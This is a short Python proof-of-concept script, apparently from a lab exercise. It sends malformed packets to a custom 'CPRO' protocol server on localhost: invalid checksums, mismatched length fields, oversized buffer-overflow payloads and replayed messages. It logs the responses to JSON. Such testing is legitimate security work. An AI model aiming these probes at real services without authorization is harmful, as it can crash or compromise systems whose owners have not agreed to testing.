#!/usr/bin/env python3
import socket
import struct
import time


class ProtocolExploit:
    def __init__(self, target_host='127.0.0.1', target_port=8888):
        self.target_host = target_host
        self.target_port = target_port
        self.magic = b"CPRO"
        self.version = 1

    def checksum(self, data):
        return sum(data) % 256

    def craft_message(self, msg_type, data, override_length=None, override_checksum=None):
        if isinstance(data, str):
            data = data.encode()
        if data is None:
            data = b""

        length = len(data) if override_length is None else int(override_length)
        header = struct.pack("!4sBBH", self.magic, self.version, int(msg_type), length)

        cs = self.checksum(data)
        if override_checksum is not None:
            cs = int(override_checksum) & 0xFF

        return header + data + struct.pack("!B", cs)

    def send_packet(self, packet, note):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target_host, self.target_port))

            # receive server messages (optional)
            try:
                s.recv(4096)
                s.recv(4096)
                s.recv(4096)
            except Exception:
                pass

            s.sendall(packet)
            time.sleep(0.5)

            try:
                resp = s.recv(4096)
                return True, resp
            except Exception:
                return True, b""

        except Exception as e:
            return False, str(e).encode()
        finally:
            try:
                s.close()
            except Exception:
                pass

    def craft_malicious_packet(self):
        """
        Craft packets to test vulnerabilities:
        - invalid checksum
        - oversized length field
        - oversized payload
        - replay attack
        """
        cases = []

        valid_data = b"HELLO"
        valid_pkt = self.craft_message(3, valid_data)

        # Invalid checksum
        invalid_checksum_pkt = self.craft_message(3, valid_data, override_checksum=0)
        cases.append(("Invalid checksum", invalid_checksum_pkt))

        # Oversized length field (claims huge length, sends small data)
        oversized_length_pkt = self.craft_message(3, valid_data, override_length=5000)
        cases.append(("Oversized length field", oversized_length_pkt))

        # Oversized payload
        big_payload = b"A" * 5000
        big_payload_pkt = self.craft_message(3, big_payload)
        cases.append(("Oversized payload", big_payload_pkt))

        # Replay attack
        cases.append(("Replay valid message #1", valid_pkt))
        cases.append(("Replay valid message #2", valid_pkt))

        return cases

    def test_checksum_bypass(self):
        pkt = self.craft_message(3, b"TEST", override_checksum=123)
        ok, resp = self.send_packet(pkt, "checksum_bypass")
        return {
            "test": "checksum_bypass",
            "success": ok,
            "response_preview": resp[:120].decode(errors="ignore")
        }

    def test_buffer_overflow(self):
        pkt = self.craft_message(3, b"A" * 10000)
        ok, resp = self.send_packet(pkt, "buffer_overflow")
        return {
            "test": "buffer_overflow",
            "success": ok,
            "response_preview": resp[:120].decode(errors="ignore")
        }

    def run_exploit_tests(self):
        results = []

        for note, packet in self.craft_malicious_packet():
            ok, resp = self.send_packet(packet, note)
            results.append({
                "case": note,
                "sent_len": len(packet),
                "success": ok,
                "response_preview": resp[:120].decode(errors="ignore")
            })

        results.append(self.test_checksum_bypass())
        results.append(self.test_buffer_overflow())

        return results


# WARNING: Only run against authorized test systems
if __name__ == "__main__":
    print("Exploit testing - authorized systems only")
    print("[*] This PoC targets only localhost test server (127.0.0.1:8888).")

    exploit = ProtocolExploit()
    results = exploit.run_exploit_tests()

    import json
    with open("exploit_test_results.json", "w") as f:
        json.dump(results, f, indent=2)

    print("[+] Saved exploit_test_results.json")
    print("[*] Review server behavior and document outcomes.")
